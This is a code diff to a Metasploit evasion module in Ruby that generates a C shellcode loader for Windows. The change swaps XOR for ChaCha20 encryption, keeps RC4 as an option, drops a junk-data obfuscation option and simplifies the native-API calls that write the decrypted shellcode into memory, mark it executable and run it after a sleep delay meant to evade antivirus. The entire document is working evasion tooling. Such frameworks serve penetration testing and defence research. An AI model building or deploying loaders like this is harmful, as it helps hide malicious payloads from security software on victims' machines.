@@ -1,6 +1,8 @@
 require 'metasploit/framework/compiler/mingw'
+require 'metasploit/framework/compiler/windows'
+
 class MetasploitModule < Msf::Evasion
-  INCLUDE_DIR = File.join(Msf::Config.data_directory, 'headers', 'windows', 'rc4.h')
+  RC4 = File.join(Msf::Config.data_directory, 'headers', 'windows', 'rc4.h')
   def initialize(info = {})
     super(
       merge_info(
@@ -27,9 +29,8 @@ class MetasploitModule < Msf::Evasion
       )
     register_options(
       [
-        OptEnum.new('CIPHER', [ true, 'Shellcode encryption type', 'xor', ['xor', 'rc4']]),
-        OptInt.new('SLEEP', [false, 'Sleep time before executing shellcode', 20000]),
-        OptBool.new('JUNK', [false, 'Add random info to the final executable', true])
+        OptEnum.new('CIPHER', [ true, 'Shellcode encryption type', 'chacha', ['chacha', 'rc4']]),
+        OptInt.new('SLEEP', [false, 'Sleep time in milliseconds before executing shellcode', 20000]),
       ]
     )
 
@@ -183,8 +184,9 @@ class MetasploitModule < Msf::Evasion
   end
 
   def headers
-    @headers = "#include <windows.h>\n"
-    @headers << "#include \"#{INCLUDE_DIR}\"\n" if datastore['CIPHER'] == 'rc4'
+    @headers = "#include <Windows.h>\n"
+    @headers << "#include \"#{RC4}\"\n" if datastore['CIPHER'] == 'rc4'
+    @headers << "#include \"chacha.h\"\n" if datastore['CIPHER'] == 'chacha'
     @headers
   end
 
@@ -361,8 +363,8 @@ class MetasploitModule < Msf::Evasion
             // If this is NTDLL.dll, exit loop.
             PCHAR DllName = _RVA2VA(PCHAR, DllBase, ExportDirectory->Name);
 
-            if ((*(ULONG*)DllName | 0x20202020) != 'ldtn') continue;
-            if ((*(ULONG*)(DllName + 4) | 0x20202020) == 'ld.l') break;
+            if ((*(ULONG*)DllName) != 'ldtn') continue;
+            if ((*(ULONG*)(DllName + 4)) == 'ld.l') break;
         }
 
         if (!ExportDirectory) return FALSE;
@@ -433,25 +435,9 @@ class MetasploitModule < Msf::Evasion
     @
   end
 
-  def filler
-    %(
-            char* _msf_#{Rex::Text.rand_text_alpha(3..10)} = "#{Rex::Text.rand_mail_address}";
-            char* _msf_#{Rex::Text.rand_text_alpha(3..10)} = "#{Rex::Text.rand_mail_address}";
-            char* _msf_#{Rex::Text.rand_text_alpha(3..10)} = "#{Rex::Text.rand_name} #{Rex::Text.rand_surname}";
-            char* _msf_#{Rex::Text.rand_text_alpha(3..10)} = "#{Rex::Text.rand_mail_address}";
-            char* _msf_#{Rex::Text.rand_text_alpha(3..10)} = "#{Rex::Text.rand_guid}";
-            char* _msf_#{Rex::Text.rand_text_alpha(3..10)} = "#{Rex::Text.rand_guid}";
-            char* _msf_#{Rex::Text.rand_text_alpha(3..10)} = "#{Rex::Text.rand_guid}";
-            char* _msf_#{Rex::Text.rand_text_alpha(3..10)} = "#{Rex::Text.rand_guid}";
-            char* _msf_#{Rex::Text.rand_text_alpha(3..10)} =  "#{Rex::Text.rand_name} #{Rex::Text.rand_surname}";
-            char* _msf_#{Rex::Text.rand_text_alpha(3..10)} =  "#{Rex::Text.rand_name} #{Rex::Text.rand_surname}";
-        )
-  end
-
   def exec_func
     %^
         #{get_payload}
-        #{Rex::Text.to_c key, Rex::Text::DefaultWrap, 'key'}
         DWORD exec(void *buffer)
         {
             void (*function)();
@@ -474,34 +460,30 @@ class MetasploitModule < Msf::Evasion
             SIZE_T size = sizeof(shellcode);
             PVOID bAddress = NULL;
             int process_id = GetCurrentProcessId();
-            #{filler if datastore['JUNK']}
             cID.UniqueProcess = process_id;
             NtOpenProcess(&pHandle, PROCESS_ALL_ACCESS, &OA, &cID);
             NtAllocateVirtualMemory(pHandle, &bAddress, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
             int n = 0;
+            PBYTE temp = (char*)malloc(sizeof(shellcode));
             @
     if datastore['CIPHER'] == 'rc4'
       @inject << %@
-            char* temp = (char*)malloc(sizeof(shellcode));
+            #{Rex::Text.to_c key, Rex::Text::DefaultWrap, 'key'}
             RC4(key, shellcode, temp, sizeof(shellcode));
-            for (int i = 0; i < sizeof(shellcode) - 1; i++)
-            {
-                NtWriteVirtualMemory(pHandle, (LPVOID)((ULONG_PTR)bAddress + n), &temp[i], 1, NULL);
-                n++;
-            }
+            NtWriteVirtualMemory(pHandle, bAddress, temp, size, NULL);
             @
     else
       @inject << %@
-            for (int i = 0; i < sizeof(shellcode) - 1; i++)
-            {
-                char temp = shellcode[i] ^ key[0] ^ key[1] ^ key[2] ^ key[3] ^ key[4] ^ key[5] ^ key[6];
-                NtWriteVirtualMemory(pHandle, (LPVOID)((ULONG_PTR)bAddress + n), &temp, 1, NULL);
-                n++;
-            }
+            #{Rex::Text.to_c key[:key], Rex::Text::DefaultWrap, 'key'}
+            #{Rex::Text.to_c key[:iv], Rex::Text::DefaultWrap, 'iv'}
+            chacha_ctx ctx;
+            chacha_keysetup(&ctx, key, 256, 96);
+            chacha_ivsetup(&ctx, iv);
+            chacha_encrypt_bytes(&ctx, shellcode, temp, sizeof(shellcode));
+            NtWriteVirtualMemory(pHandle, bAddress, temp, size, NULL);
             @
     end
     @inject << %@
-            #{filler if datastore['JUNK']}
             NtProtectVirtualMemory(pHandle, &bAddress, &size, PAGE_EXECUTE, &old);
             #{s if datastore['SLEEP'] > 0};
             HANDLE thread = NULL;
@@ -517,7 +499,6 @@ class MetasploitModule < Msf::Evasion
     %^
         int main()
         {
-            #{filler if datastore['JUNK']}
             inject();
         }
         ^
@@ -527,7 +508,9 @@ class MetasploitModule < Msf::Evasion
     if datastore['CIPHER'] == 'rc4'
       @key ||= Rex::Text.rand_text_alpha(32..64)
     else
-      @key ||= Rex::Text.rand_text(7)
+      @key ||= Rex::Text.rand_text(32)
+      @iv ||= Rex::Text.rand_text(12)
+      return { iv: @iv, key: @key }
     end
   end
 
@@ -535,8 +518,9 @@ class MetasploitModule < Msf::Evasion
     junk = Rex::Text.rand_text(10..1024)
     p = payload.encoded + junk
     vprint_status("Payload size: #{p.size} = #{payload.encoded.size} + #{junk.size} (junk)")
-    if datastore['CIPHER'] == 'xor'
-      key.each_byte { |x| p = Rex::Text.xor(x, p) }
+    if datastore['CIPHER'] == 'chacha'
+      chacha = Rex::Crypto::Chacha20.new(key[:key], key[:iv])
+      p = chacha.chacha20_crypt(p)
       Rex::Text.to_c p, Rex::Text::DefaultWrap, 'shellcode'
     else
       opts = { format: 'rc4', key: key }
@@ -574,6 +558,7 @@ class MetasploitModule < Msf::Evasion
     src << exec_func
     src << inject
     src << main
+    # obf_src =  Metasploit::Framework::Compiler::Windows.generate_random_c src
     path = Tempfile.new('main').path
     vprint_status path
     compile_opts =
